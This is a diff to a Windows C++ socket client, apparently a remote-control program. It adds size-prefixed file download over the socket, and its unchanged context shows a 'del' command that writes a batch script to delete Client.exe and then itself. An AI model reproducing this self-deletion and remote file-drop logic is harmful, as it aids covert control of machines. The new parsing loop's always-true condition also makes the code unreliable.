@@ -1,5 +1,6 @@
 //Client
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
+#define _CRT_SECURE_NO_WARNINGS
 #include <stdio.h>
 #include <string>
 #include <iostream>
@@ -119,10 +120,35 @@ int main()
 				NULL);
 			const int bufsize = 1024;
 			DWORD dwBytesWritten;
-			while (1) {
+			bool start = true;
+			int filesize = 0;
+			int bytesrec = 0;
+			do {
+				int unread = 0; //
 				bool exit = false;
 				char buff[bufsize] = "";
 				int nbytes = recv(my_sock, buff, sizeof(buff), 0);
+				if (start) {
+					//тут надо будет получить полный массив, т.е если буффер меньше 1024 то по одному элементу пихать в массив.
+					for (int k = 0; sizeof(buff) / sizeof(char); k++) {
+						if ((buff[k] == '%') && (buff[k + 1] == 'b') && (buff[k + 2] == 'y') && (buff[k + 3] == 't') && (buff[k + 4] == 'e') && (buff[k + 5] == '%')) {
+							unread += 6;
+							char *temp = new char[unread - 6];
+							strncpy(temp, buff, unread - 6);
+							filesize = atoi(temp);
+							delete[]temp;
+							break;
+						}
+						else {
+							unread++;
+						}
+					}
+					start = false;
+					bytesrec += nbytes - unread;
+				}
+				else {
+					bytesrec += nbytes;
+				}
 				if (nbytes == 0) {
 					break;
 				}
@@ -130,19 +156,20 @@ int main()
 				{
 					break;
 				}
-				if ((buff[bufsize - 1] == '@') && (buff[bufsize - 2] == '@') && (buff[bufsize - 3] == '^')) {exit = true; }
+				if ((buff[bufsize - 1] == '@') && (buff[bufsize - 2] == '@') && (buff[bufsize - 3] == '^')) { exit = true; }
 				if (exit) {
 					if (!checkend(buff, bufsize)) {
 						break;
 					}
 					WriteFile(hFile, buff, nbytes - 3, &dwBytesWritten, NULL);
-						break;
+					break;
 				}
 				else {
-					WriteFile(hFile, buff, nbytes, &dwBytesWritten, NULL);
+					WriteFile(hFile, buff + unread, nbytes - unread, &dwBytesWritten, NULL);
 				}
-			}
+			} while (bytesrec < filesize);
 			CloseHandle(hFile);
+			cout << bytesrec<<endl;
 		}
 		else if ((buff[0]=='d')&&(buff[1]=='e')&&(buff[2]=='l')) {
 			char delfile[] = "@echo off\n:loop\ndel Client.exe\nif exist 1.txt goto : loop\ndel %0";
